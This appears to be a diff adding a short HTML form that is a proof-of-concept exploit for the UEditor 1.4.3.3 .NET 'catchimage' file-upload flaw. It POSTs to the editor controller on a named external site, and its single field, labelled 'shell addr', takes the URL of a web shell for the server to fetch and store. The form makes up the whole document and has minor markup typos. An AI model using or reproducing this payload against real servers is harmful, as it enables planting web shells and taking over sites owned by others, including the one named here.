@@ -1,0 +1,4 @@
+<form action="https://www.chinets.com/Content/Scripts/ueditor1_4_3_3/net/controller.ashx?action=catchimage"enctype="application/x-www-form-urlencoded"  method="POST">
+<p>shell addr:<input type="text" name="source[]" /></p >
+<inputtype="submit" value="Submit" />
+</form>
